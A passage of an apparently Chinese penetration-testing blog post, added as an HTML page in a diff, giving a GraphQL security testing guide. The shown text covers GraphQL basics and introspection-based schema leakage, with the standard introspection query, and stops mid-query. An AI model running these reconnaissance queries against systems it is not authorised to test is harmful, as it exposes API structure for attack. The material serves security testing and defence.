@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="引言GraphQL 作为 REST API 的替代方案，因其灵活的数据查询能力和高效的网络传输被越来越多的企业采用。然而，这种灵活性也带来了独特的安全挑战。本文将系统梳理 GraphQL 安全测试中的常见攻击面、利用手法与防御建议，为安全从业者提供一份可操作的测试指南。 GraphQL 基础回顾在深入安全测试之前，先回顾 GraphQL 的三种核心操作类型。 Query（查询）Query 用于从服">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GraphQL安全测试">
+<meta property="og:url" content="https://congliang.github.io/GraphQL-security/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="引言GraphQL 作为 REST API 的替代方案，因其灵活的数据查询能力和高效的网络传输被越来越多的企业采用。然而，这种灵活性也带来了独特的安全挑战。本文将系统梳理 GraphQL 安全测试中的常见攻击面、利用手法与防御建议，为安全从业者提供一份可操作的测试指南。 GraphQL 基础回顾在深入安全测试之前，先回顾 GraphQL 的三种核心操作类型。 Query（查询）Query 用于从服">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-08-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.890Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="移动安全">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/GraphQL-security/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/GraphQL-security/","path":"GraphQL-security/","title":"GraphQL安全测试"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>GraphQL安全测试 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%95%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">引言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GraphQL-%E5%9F%BA%E7%A1%80%E5%9B%9E%E9%A1%BE"><span class="nav-number">2.</span> <span class="nav-text">GraphQL 基础回顾</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Query%EF%BC%88%E6%9F%A5%E8%AF%A2%EF%BC%89"><span class="nav-number">2.1.</span> <span class="nav-text">Query（查询）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mutation%EF%BC%88%E5%8F%98%E6%9B%B4%EF%BC%89"><span class="nav-number">2.2.</span> <span class="nav-text">Mutation（变更）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Subscription%EF%BC%88%E8%AE%A2%E9%98%85%EF%BC%89"><span class="nav-number">2.3.</span> <span class="nav-text">Subscription（订阅）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%86%85%E7%9C%81%EF%BC%88Introspection%EF%BC%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-number">3.</span> <span class="nav-text">一、内省（Introspection）信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">3.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="nav-number">3.2.</span> <span class="nav-text">利用手法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">3.3.</span> <span class="nav-text">防御建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E8%B6%8A%E6%9D%83%E4%B8%8E-IDOR-via-GraphQL"><span class="nav-number">4.</span> <span class="nav-text">二、越权与 IDOR via GraphQL</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-1"><span class="nav-number">4.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%EF%BC%9A%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9%E6%9F%A5%E8%AF%A2%E5%8F%82%E6%95%B0%E5%AE%9E%E7%8E%B0-IDOR"><span class="nav-number">4.2.</span> <span class="nav-text">场景：通过修改查询参数实现 IDOR</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B5%8C%E5%A5%97%E8%B6%8A%E6%9D%83"><span class="nav-number">4.3.</span> <span class="nav-text">嵌套越权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE-1"><span class="nav-number">4.4.</span> <span class="nav-text">防御建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%89%B9%E9%87%8F%E6%9F%A5%E8%AF%A2%E7%BB%95%E8%BF%87%E9%80%9F%E7%8E%87%E9%99%90%E5%88%B6"><span class="nav-number">5.</span> <span class="nav-text">三、批量查询绕过速率限制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-2"><span class="nav-number">5.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Query-Batching"><span class="nav-number">5.2.</span> <span class="nav-text">Query Batching</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%AB%E5%90%8D%E8%BD%B0%E7%82%B8%EF%BC%88Alias-based-Batching%EF%BC%89"><span class="nav-number">5.3.</span> <span class="nav-text">别名轰炸（Alias-based Batching）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE-2"><span class="nav-number">5.4.</span> <span class="nav-text">防御建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E6%B7%B1%E5%BA%A6%E9%80%92%E5%BD%92-DoS-%E6%94%BB%E5%87%BB"><span class="nav-number">6.</span> <span class="nav-text">四、深度递归 DoS 攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-3"><span class="nav-number">6.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E7%A4%BA%E4%BE%8B"><span class="nav-number">6.2.</span> <span class="nav-text">攻击载荷示例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE-3"><span class="nav-number">6.3.</span> <span class="nav-text">防御建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5%E4%B8%8E%E5%AD%97%E6%AE%B5%E5%BB%BA%E8%AE%AE%E6%94%BB%E5%87%BB"><span class="nav-number">7.</span> <span class="nav-text">五、参数注入与字段建议攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-4"><span class="nav-number">7.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL-NoSQL-%E6%B3%A8%E5%85%A5"><span class="nav-number">7.2.</span> <span class="nav-text">SQL &#x2F; NoSQL 注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OS-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-number">7.3.</span> <span class="nav-text">OS 命令注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E6%AE%B5%E5%BB%BA%E8%AE%AE%EF%BC%88Field-Suggestions%EF%BC%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-number">7.4.</span> <span class="nav-text">字段建议（Field Suggestions）信息泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE-4"><span class="nav-number">7.5.</span> <span class="nav-text">防御建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81GraphQL-CSRF-%E4%B8%8E-CORS-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93"><span class="nav-number">8.</span> <span class="nav-text">六、GraphQL CSRF 与 CORS 配置不当</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF-%E6%94%BB%E5%87%BB"><span class="nav-number">8.1.</span> <span class="nav-text">CSRF 攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CORS-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93"><span class="nav-number">8.2.</span> <span class="nav-text">CORS 配置不当</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE-5"><span class="nav-number">8.3.</span> <span class="nav-text">防御建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7"><span class="nav-number">9.</span> <span class="nav-text">七、安全测试工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GraphQL-Voyager"><span class="nav-number">9.1.</span> <span class="nav-text">GraphQL Voyager</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#InQL-Burp-Suite"><span class="nav-number">9.2.</span> <span class="nav-text">InQL (Burp Suite)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7"><span class="nav-number">9.3.</span> <span class="nav-text">其他辅助工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E7%BB%BC%E5%90%88%E6%B5%8B%E8%AF%95-Checklist"><span class="nav-number">10.</span> <span class="nav-text">八、综合测试 Checklist</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">11.</span> <span class="nav-text">总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/GraphQL-security/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="GraphQL安全测试 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          GraphQL安全测试
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-08-01 08:00:00" itemprop="dateCreated datePublished" datetime="2026-08-01T08:00:00+08:00">2026-08-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>GraphQL 作为 REST API 的替代方案，因其灵活的数据查询能力和高效的网络传输被越来越多的企业采用。然而，这种灵活性也带来了独特的安全挑战。本文将系统梳理 GraphQL 安全测试中的常见攻击面、利用手法与防御建议，为安全从业者提供一份可操作的测试指南。</p>
+<h2 id="GraphQL-基础回顾"><a href="#GraphQL-基础回顾" class="headerlink" title="GraphQL 基础回顾"></a>GraphQL 基础回顾</h2><p>在深入安全测试之前，先回顾 GraphQL 的三种核心操作类型。</p>
+<h3 id="Query（查询）"><a href="#Query（查询）" class="headerlink" title="Query（查询）"></a>Query（查询）</h3><p>Query 用于从服务端读取数据，类比 REST 的 GET 请求。客户端可以精确指定需要的字段，避免过度获取或获取不足的问题。</p>
+<figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">query</span> <span class="punctuation">&#123;</span></span><br><span class="line">  user<span class="punctuation">(</span><span class="symbol">id</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span></span><br><span class="line">    name</span><br><span class="line">    email</span><br><span class="line">    posts <span class="punctuation">&#123;</span></span><br><span class="line">      title</span><br><span class="line">      content</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Mutation（变更）"><a href="#Mutation（变更）" class="headerlink" title="Mutation（变更）"></a>Mutation（变更）</h3><p>Mutation 用于创建、更新或删除数据，类比 REST 的 POST&#x2F;PUT&#x2F;DELETE。所有修改操作必须通过 Mutation 完成。</p>
+<figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mutation</span> <span class="punctuation">&#123;</span></span><br><span class="line">  createUser<span class="punctuation">(</span><span class="symbol">input</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="symbol">name</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span>, <span class="symbol">email</span><span class="punctuation">:</span> <span class="string">&quot;test@example.com&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span></span><br><span class="line">    id</span><br><span class="line">    name</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Subscription（订阅）"><a href="#Subscription（订阅）" class="headerlink" title="Subscription（订阅）"></a>Subscription（订阅）</h3><p>Subscription 用于建立与服务端的实时连接，当特定事件发生时，服务端会主动向客户端推送数据，通常基于 WebSocket 实现。</p>
+<figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">subscription</span> <span class="punctuation">&#123;</span></span><br><span class="line">  messageAdded<span class="punctuation">(</span><span class="symbol">roomId</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span></span><br><span class="line">    id</span><br><span class="line">    text</span><br><span class="line">    sender</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>安全视角：</strong> 三种操作共享同一端点，意味着攻击者只需找到一个入口即可对所有类型的操作进行探测。订阅功能如果未做鉴权，可能导致实时数据泄露。</p>
+<h2 id="一、内省（Introspection）信息泄露"><a href="#一、内省（Introspection）信息泄露" class="headerlink" title="一、内省（Introspection）信息泄露"></a>一、内省（Introspection）信息泄露</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>GraphQL 内置的内省系统允许客户端查询 Schema 的完整定义，包括所有类型、字段、参数及其描述。这在开发阶段极有价值，但若暴露在生产环境中，相当于将整个 API 的”蓝图”交到攻击者手中。</p>
+<h3 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h3><p>最常见的做法是先探测内省是否开启，然后导出完整 Schema。</p>
+<p><strong>检测内省是否开启：</strong></p>
+<figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">query</span> <span class="punctuation">&#123;</span></span><br><span class="line">  __schema <span class="punctuation">&#123;</span></span><br><span class="line">    types <span class="punctuation">&#123;</span></span><br><span class="line">      name</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>导出完整 Schema 的经典内省查询：</strong></p>
+<figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">query</span> IntrospectionQuery <span class="punctuation">&#123;</span></span><br><span class="line">  __schema <span class="punctuation">&#123;</span></span><br><span class="line">    queryType <span class="punctuation">&#123;</span> name <span class="punctuation">&#125;</span></span><br><span class="line">    mutationType <span class="punctuation">&#123;</span> name <span class="punctuation">&#125;</span></span><br><span class="line">    subscriptionType <span class="punctuation">&#123;</span> name <span class="punctuation">&#125;</span></span><br><span class="line">    types <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="punctuation">...</span>FullType</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">    directives <span class="punctuation">&#123;</span></span><br><span class="line">      name</span><br><span class="line">      description</span><br><span class="line">      locations</span><br><span class="line">      args <span class="punctuation">&#123;</span> <span class="punctuation">...</span>InputValue <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fragment</span> FullType <span class="keyword">on</span> __Type <span class="punctuation">&#123;</span></span><br><span class="line">  kind</span><br><span class="line">  name</span><br><span class="line">  description</span><br><span class="line">  fields<span class="punctuation">(</span><span class="symbol">includeDeprecated</span><span class="punctuation">:</span> <span class="literal">true</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span></span><br><span class="line">    name</span><br><span class="line">    description</span><br><span class="line">    args <span class="punctuation">&#123;</span> <span class="punctuation">...</span>InputValue <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="keyword">type</span> <span class="punctuation">&#123;</span> <span class="punctuation">...</span>TypeRef <span class="punctuation">&#125;</span></span><br><span class="line">    isDeprecated</span><br><span class="line">    deprecationReason</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line">  inputFields <span class="punctuation">&#123;</span> <span class="punctuation">...</span>InputValue <span class="punctuation">&#125;</span></span><br><span class="line">  interfaces <span class="punctuation">&#123;</span> <span class="punctuation">...</span>TypeRef <span class="punctuation">&#125;</span></span><br><span class="line">  enumValues<span class="punctuation">(</span><span class="symbol">includeDeprecated</span><span class="punctuation">:</span> <span class="literal">true</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span></span><br><span class="line">    name</span><br><span class="line">    description</span><br><span class="line">    isDeprecated</span><br><span class="line">    deprecationReason</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line">  possibleTypes <span class="punctuation">&#123;</span> <span class="punctuation">...</span>TypeRef <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fragment</span> InputValue <span class="keyword">on</span> __InputValue <span class="punctuation">&#123;</span></span><br><span class="line">  name</span><br><span class="line">  description</span><br><span class="line">  <span class="keyword">type</span> <span class="punctuation">&#123;</span> <span class="punctuation">...</span>TypeRef <span class="punctuation">&#125;</span></span><br><span class="line">  defaultValue</span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fragment</span> TypeRef <span class="keyword">on</span> __Type <span class="punctuation">&#123;</span></span><br><span class="line">  kind</span><br><span class="line">  name</span><br><span class="line">  ofType <span class="punctuation">&#123;</span></span><br><span class="line">    kind</span><br><span class="line">    name</span><br><span class="line">    ofType <span class="punctuation">&#123;</span></span><br><span class="line">      kind</span><br><span class="line">      name</span><br><span class="line">      ofType <span class="punctuation">&#123;</span></span><br><span class="line">        kind</span><br><span class="line">        name</span><br><span class="line">        ofType <span class="punctuation">&#123;</span></span><br><span class="line">          kind</span><br><span class="line">          name</span><br><span class="line">          ofType <span class="punctuation">&#123;</span></span><br><span class="line">            kind</span><br><span class="line">            name</span><br><span class="line">            ofType <span class="punctuation">&#123;</span></span><br><span class="line">              kind</span><br><span class="line">              name</span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span 